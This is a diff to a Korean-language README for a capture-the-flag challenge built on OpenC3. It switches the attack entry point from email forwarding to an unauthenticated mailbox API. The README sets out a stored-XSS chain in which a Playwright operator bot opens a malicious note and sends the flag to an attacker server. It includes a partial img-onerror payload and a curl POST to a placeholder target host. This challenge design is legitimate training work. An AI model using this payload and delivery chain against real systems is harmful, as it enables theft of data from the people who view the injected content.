@@ -3,8 +3,7 @@
 ## 전체 공격 체인
 
 ```
-공격자 이메일 발송
-  → 이메일 포워딩 데몬 (ctf-email-daemon)
+공격자가 공개 쪽지 제출 API로 악성 쪽지 등록 (POST /openc3-api/mailbox, 인증 없음)
   → OpenC3 쪽지 DB (Redis)
   → 관제사 봇 (ctf-operator-bot, Playwright)이 쪽지 클릭
   → XSS 페이로드 브라우저 실행
@@ -13,26 +12,28 @@
   → 공격자 서버에 flag 수신
 ```
 
+`POST /openc3-api/mailbox`는 관제사가 외부 클라이언트와 소통(문의 접수)하기 위해
+의도적으로 인증 없이 열어둔 채널입니다. 공격자는 이 주소만 알면 되고,
+관제 시스템 계정이나 이메일 계정 자격증명은 전혀 필요하지 않습니다.
+
 ## 서비스 구성
 
 | 서비스 | 역할 |
 |--------|------|
-| `ctf-email-daemon` | Gmail IMAP 폴링 → OpenC3 쪽지 API POST |
 | `ctf-operator-bot` | Playwright 브라우저 봇 (쪽지 주기적 열람) |
 | `/flag.txt` | OpenC3 cmd-tlm-api 컨테이너 내 flag 파일 |
 
 ## 환경변수 설정 (.env)
 
 ```env
-CTF_EMAIL_USER=ctf-controller@gmail.com
-CTF_EMAIL_PASS=<Gmail 앱 비밀번호>
 CTF_BOT_USERNAME=operator
 CTF_BOT_PASSWORD=operator
 ```
 
 ## 공격자 XSS 페이로드 예시
 
-공격자는 아래 HTML을 담은 이메일을 `ctf-controller@gmail.com`으로 발송:
+공격자는 아래 HTML을 body로 담아 공개 쪽지 API에 직접 등록합니다
+(`ctf-services/send_xss.py` 참고):
 
 ```html
 <img src="x" onerror="
@@ -51,6 +52,12 @@ CTF_BOT_PASSWORD=operator
   });
 })();
 ">
+```
+
+```bash
+curl -X POST http://TARGET_HOST:2900/openc3-api/mailbox \
+  -H 'Content-Type: application/json' \
+  -d '{"from_email":"attacker@example.com","subject":"긴급 공지","body":"<위 HTML>","scope":"DEFAULT"}'
 ```
 
 ## 왜 봇은 Python/curl이 아닌 Playwright여야 하는가?
